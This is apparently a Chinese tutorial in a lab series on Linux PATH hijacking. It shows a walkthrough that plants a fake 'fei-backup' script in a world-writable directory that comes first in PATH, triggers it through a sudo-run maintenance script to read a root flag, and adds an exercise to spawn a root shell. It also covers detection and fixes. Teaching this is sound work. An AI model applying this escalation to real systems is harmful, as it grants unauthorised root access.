# Day 07：PATH Hijacking — Linux 最後到底執行了哪一個程式？


---

## 開場

root 有一個維護腳本，腳本裡寫了 `fei-backup`。

它沒寫 `/usr/local/bin/fei-backup`，只寫了 `fei-backup`。

Linux 會去哪裡找這個程式？如果我比真正的 `fei-backup` 更早被找到呢？

---

## 今天要解決的問題

1. PATH 是什麼？Shell 怎麼用它？
2. 什麼是「絕對路徑」跟「相對命令」？
3. 「PATH 裡有可寫目錄」就一定能提權嗎？
4. PATH Hijacking 和 Day 05 的 sudo abuse 有什麼不同？

---

## 背景知識

### Shell 怎麼找到你要的程式？

當你在 terminal 輸入 `ls`，shell 並不是在整台電腦上搜尋。它會看 `PATH` 環境變數。

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

PATH 是一串用 `:` 分隔的目錄清單。Shell 從**左到右**逐一搜尋，找到第一個符合的就執行。

### 絕對路徑 vs 相對命令

```bash
# 絕對路徑 — 直接指定，不受 PATH 影響
/usr/local/bin/fei-backup

# 相對命令 — 必須透過 PATH 搜尋
fei-backup
```

如果使用相對命令，最終執行哪個檔案完全取決於 PATH 的搜尋順序和各目錄中的內容。

---

## OS 原理：Shell Command Resolution Algorithm

![Shell Command Resolution Algorithm](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day07-path-hijacking-diagram-01.png)


當 shell 收到命令 `fei-backup` 時，完整的解析流程：


**關鍵**：如果攻擊者可以在**排名更前面的目錄**放入同名程式，shell 就會優先執行攻擊者的版本。

### PATH 搜尋的實際行為

```bash
# 假設 PATH=/opt/user-bin:/usr/local/bin:/usr/bin:/bin

# shell 需要執行 "fei-backup"
# 1. 檢查 /opt/user-bin/fei-backup  → 存在！→ 執行它
# 2. 永遠不會檢查 /usr/local/bin/fei-backup（已經找到了）
```

---

## 🔬 FEI Lab 環境

```
Scenario:   FEI-L03-PATH
VM:         FEI-PRIVESC-LINUX (Ubuntu 22.04.4 LTS)
起始帳號:   fei-student (uid=1001)
目標:       root
Flag:       /root/fei-l03-flag.txt
```



### 場景準備

`ash
# 1. 以 fei-labadmin 登入
ssh fei-labadmin@192.168.77.10
# 密碼：FEI-LabAdmin-2026!

# 2. 進入場景目錄並 setup
cd /opt/fei-privesc/scenarios/FEI-L03-PATH
sudo ./fei-setup.sh

# 3. 確認場景就緒
sudo ./fei-verify.sh
# 應看到 L03-PATH STATUS: READY

# 4. 切換到 fei-student
su - fei-student
# 密碼：FEI-Student-2026!
`

### 部署過程

setup 建立了：

1. **Maintenance script** `/usr/local/bin/fei-l03-maintenance`（root:root 755）
   - 內部設定 `PATH=/opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin:/usr/local/bin:/usr/bin:/bin`
   - 呼叫 `fei-backup`（沒有絕對路徑！）
2. **真正的 fei-backup** `/usr/local/bin/fei-backup`（benign）
3. **User-writable PATH 目錄** `/opt/.../user-bin/`（mode 777）
4. **Sudo rule**：fei-student 只能 `sudo /usr/local/bin/fei-l03-maintenance`
5. **Flag** `/root/fei-l03-flag.txt`（0600 root:root）

verify 確認了 15 項檢查：

```
[PASS] maintenance script invokes command without absolute path
[PASS] user-controlled PATH directory exists
[PASS] fei-student can write to user-controlled PATH directory
[PASS] PATH directory precedes trusted location
[PASS] elevated execution is narrowly scoped
[PASS] FEI-L01 sudo rule is absent
[PASS] FEI-L02 SUID weakness is absent
```

---

## 完整攻擊流程

### Step 1：發現 sudo 權限

```bash
fei-student@fei-privesc-linux:~$ sudo -l
User fei-student may run the following commands on fei-privesc-linux:
    (root) NOPASSWD: /usr/local/bin/fei-l03-maintenance
```

### Step 2：讀取 maintenance script

```bash
fei-student@fei-privesc-linux:~$ cat /usr/local/bin/fei-l03-maintenance
#!/bin/bash
# FEI Lab Maintenance Script

export PATH="/opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin:/usr/local/bin:/usr/bin:/bin"

echo "[FEI Maintenance] Starting maintenance routine..."
echo "[FEI Maintenance] Checking lab status..."
echo "[FEI Maintenance] Running backup..."
fei-backup                                              ← 沒有絕對路徑！
echo "[FEI Maintenance] Maintenance complete."
```

**兩個關鍵發現**：
1. `fei-backup` 使用相對命令（沒寫 `/usr/local/bin/fei-backup`）
2. PATH 把 `user-bin` 放在 `/usr/local/bin` **前面**

### Step 3：檢查 user-bin 目錄

```bash
fei-student@fei-privesc-linux:~$ ls -la /opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin/
total 8
drwxrwxrwx  2 root root 4096 Sep 14 07:23 .
drwxr-xr-x  3 root root 4096 Sep 14 07:23 ..
```

**drwxrwxrwx** — 所有人可寫！而且目前是空的。

### Step 4：Attack Hypothesis

![PATH Hijacking Attack Hypothesis](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day07-path-hijacking-diagram-02.png)



### Step 5：建立 fake fei-backup

```bash
fei-student@fei-privesc-linux:~$ cat > /opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin/fei-backup << 'EOF'
#!/bin/bash
cat /root/fei-l03-flag.txt
EOF

fei-student@fei-privesc-linux:~$ chmod +x /opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin/fei-backup
```

### Step 6：觸發

```bash
fei-student@fei-privesc-linux:~$ sudo /usr/local/bin/fei-l03-maintenance
[FEI Maintenance] Starting maintenance routine...
[FEI Maintenance] Checking lab status...
[FEI Maintenance] Running backup...
FEI{LINUX_L03_PATH_ROOT_ACCESS}
[FEI Maintenance] Maintenance complete.
```

---

## Attack Path

![PATH Hijacking Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day07-path-hijacking-diagram-03.png)



---

## Attack Reasoning：為什麼它真的成立？

![PATH Hijacking Attack Reasoning](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day07-path-hijacking-diagram-04.png)



**L01 vs L03 的差異**：

| | L01 sudo | L03 PATH |
|---|---------|----------|
| 漏洞本質 | binary 本身有 escape 功能 | 子命令受 PATH 影響 |
| 被利用的是 | find 的 `-exec` 功能 | shell 的 PATH 搜尋機制 |
| 需要修改的 | 不需要（find 本身就有功能）| 需要在 writable dir 建立檔案 |
| Root cause | 錯誤委派了太強大的工具 | 使用相對路徑 + 不安全的 PATH |

---

## False Positive

### 「PATH 有可寫目錄」≠「能提權」

很多系統的 PATH 包含使用者目錄（如 `/home/user/bin`），但這**不代表**能提權。

PATH Hijacking 需要同時滿足：

```
✓ 高權限 context（root/sudo/SUID）
+ 
✓ 使用相對命令（不是絕對路徑）
+
✓ PATH 中有 attacker-writable 目錄
+
✓ writable 目錄在真正 binary 之前
=
PATH Hijacking 可能成立
```

缺少任何一個，都不構成可利用的漏洞。

### secure_path 的保護

```
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

如果 sudoers 設定了 `secure_path`，sudo 會用這個 PATH 覆蓋使用者的 PATH。這是重要的防禦機制。

但在我們的 Lab 中，漏洞 PATH 是寫死在 **script 內部**（`export PATH=...`），不受 `secure_path` 影響。

---

## Edge Case

### dash vs bash 的 PATH 處理

Ubuntu 的 `/bin/sh` 連結到 `dash`，不是 `bash`。dash 和 bash 在 PATH 處理上有細微差異：

- **bash**：支援 hash table（已查過的命令會被快取）
- **dash**：不使用 hash table，每次都重新搜尋 PATH

### sudo 的 env_reset

預設情況下，`sudo` 會重設環境變數（包括 PATH）。但如果使用 `sudo -E` 或 sudoers 設定了 `env_keep+=PATH`，使用者的 PATH 可能被保留。

### script 內部的 PATH vs 系統 PATH

本場景中，PATH 是在 script 內部用 `export` 設定的。即使系統的 secure_path 很安全，script 內部重新定義 PATH 仍然可以引入危險目錄。

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| 建立 fake binary 但沒效果 | 忘記 `chmod +x` | 加上執行權限 |
| `sudo: command not found` | sudo 使用了 secure_path | 本場景 PATH 在 script 內部，不受影響 |
| Flag 沒出現 | fake script 語法錯誤 | 確認 shebang 和語法正確 |
| 修改 user-bin 被拒 | user-bin 權限不是 777 | 用 `ls -la` 確認 |

---

## 防禦

### Detect

```bash
# 檢查所有 root-owned script 是否使用相對路徑
grep -rn '^[^#]*[^/]fei-\|^[^#]*[^/]backup\|^[^#]*[^/]check' /usr/local/bin/ /opt/
# 找出沒有用絕對路徑的 command 呼叫
```

### Prevent

1. **永遠使用絕對路徑**：
   ```bash
   # 安全
   /usr/local/bin/fei-backup
   
   # 危險
   fei-backup
   ```

2. **不要在 script 中設定含有使用者可寫目錄的 PATH**

3. **使用 `env -i` 清空環境**：
   ```bash
   sudo env -i /usr/local/bin/fei-l03-maintenance
   ```

4. **設定 secure_path**

### Fix Verification

```bash
# 修正後的 script 應該用絕對路徑
cat /usr/local/bin/fei-l03-maintenance | grep fei-backup
# 應看到 /usr/local/bin/fei-backup（絕對路徑）

# 驗證 attacker-controlled PATH 不再有效
su - fei-student
# 即使在 user-bin 放了 fake binary，也不會被執行
```

---

## Detection

| 監控 | 方法 |
|------|------|
| 異常 PATH 設定 | 審計高權限 script 的 PATH 設定 |
| user-bin 中的新檔案 | `inotifywait` 或 auditd 監控 |
| 非預期的程式執行 | auditd 監控 `/opt/fei-privesc/scenarios/FEI-L03-PATH/user-bin/` |

---

## Exercise

1. 修改 fake `fei-backup`，讓它不只讀 flag，而是直接開一個 root shell（提示：`/bin/bash`）
2. 如果 `fei-l03-maintenance` 裡的 PATH 把 `/usr/local/bin` 放在 `user-bin` **前面**，PATH Hijacking 還能成功嗎？
3. 嘗試用 `which fei-backup` 確認 shell 會找到哪個 `fei-backup`

---

## Quiz

**Q1**：PATH Hijacking 需要哪些條件同時滿足才能成立？

### 答案

1. 高權限 context（root/sudo/SUID/cron）
2. 使用相對命令（不是絕對路徑）
3. PATH 中有 attacker 可寫的目錄
4. 該目錄在真正 binary 的目錄之前

缺少任何一個都不構成可利用的 PATH Hijacking。



**Q2**：`sudo` 的 `secure_path` 能防止本場景的 PATH Hijacking 嗎？

### 答案

不能。因為本場景中，危險的 PATH 是寫死在 `/usr/local/bin/fei-l03-maintenance` script 內部的 `export PATH=...`。sudo 的 secure_path 只影響 sudo 啟動時的環境，不會覆蓋 script 內部重新設定的 PATH。




## 場景收尾

做完後記得 reset，避免影響下一題：

```bash
# 以 fei-labadmin 執行
ssh fei-labadmin@192.168.77.10
cd /opt/fei-privesc/scenarios/FEI-L03-PATH
sudo ./fei-reset.sh
sudo ./fei-verify.sh --reset
# 應看到 L03-PATH STATUS: RESET
```

---

## 今天真正要記住的 3 件事

1. **Shell 執行相對命令時，依照 PATH 從左到右搜尋**。第一個找到的就執行。
2. **PATH Hijacking 的真正條件不只是「有可寫目錄」**。還需要高權限 context + 相對命令 + 可寫目錄在前。
3. **L01 利用的是 binary 本身的功能；L03 利用的是 command resolution 的環境**。兩者的 Root Cause 完全不同。

---

## 給自己的問題

> 如果高權限程式不是用相對命令，而是每分鐘定期執行一個 script……而那個 script 可以被你修改呢？

→ Day 08：Cron

---

## Lab Reset

```bash
cd /opt/fei-privesc/scenarios/FEI-L03-PATH
sudo ./fei-reset.sh
sudo ./fei-verify.sh --reset
# FEI-L03 STATUS: RESET
```
